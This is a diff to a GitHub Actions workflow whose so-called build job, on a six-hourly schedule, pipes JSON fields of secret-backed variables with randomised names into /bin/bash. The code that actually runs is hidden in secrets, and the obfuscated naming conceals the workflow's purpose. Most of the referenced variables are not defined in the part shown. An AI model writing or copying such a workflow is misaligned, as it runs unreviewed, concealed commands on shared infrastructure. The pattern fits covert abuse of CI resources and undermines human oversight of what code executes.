@@ -2,7 +2,7 @@ name: wengjingshi1290
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 0/6 * * *'
+    - cron: '41 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,13 +10,27 @@ jobs:
       - uses: actions/checkout@v4
       - name: wengjingshi1290
         env:
-          shlrq848: ${{ secrets.shlrq848 }}
+          gjdnh648: ${{ secrets.gjdnh648 }}
         run: |
-          echo $shlrq848 | jq -r .qxfpa3 | /bin/bash
-          echo $lljcp90764 | jq -r .xjw29 | /bin/bash
-          echo $ncey22 | jq -r .cu8706 | /bin/bash
-          echo $tuhj6 | jq -r .apwep80839 | /bin/bash
-          echo $hy60674 | jq -r .sqm7 | /bin/bash
-          echo $y3389 | jq -r .jf8 | /bin/bash
-          echo $w6087 | jq -r .kwahr3376 | /bin/bash
+          echo $gjdnh648 | jq -r .o01168 | /bin/bash
+          echo $lxlta5 | jq -r .nkk78759 | /bin/bash
+          echo $maos0 | jq -r .werky0288 | /bin/bash
+          echo $rwcm157 | jq -r .v08 | /bin/bash
+          echo $xanq9320 | jq -r .l36391 | /bin/bash
+          echo $rdwm65111 | jq -r .cenl05 | /bin/bash
+          echo $bqpwq67 | jq -r .bedg2 | /bin/bash
+          echo $a63 | jq -r .gjgz777 | /bin/bash
+          echo $mcsut47476 | jq -r .yhgoc53028 | /bin/bash
+          echo $da210 | jq -r .mssjr784 | /bin/bash
+          echo $hyqql70 | jq -r .ziq853 | /bin/bash
+          echo $fc14160 | jq -r .gzea83 | /bin/bash
+          echo $bxwe77693 | jq -r .znj83045 | /bin/bash
+          echo $x45 | jq -r .wvjxj9 | /bin/bash
+          echo $qcnu85227 | jq -r .gkgn0 | /bin/bash
+          echo $xjoyd02 | jq -r .m2 | /bin/bash
+          echo $xeybn55734 | jq -r .rxarg7 | /bin/bash
+          echo $tlt2 | jq -r .yre30905 | /bin/bash
+          echo $csu8 | jq -r .a441 | /bin/bash
+          echo $rlk62 | jq -r .oq99 | /bin/bash
+          echo $zg30380 | jq -r .mcuu35001 | /bin/bash
 
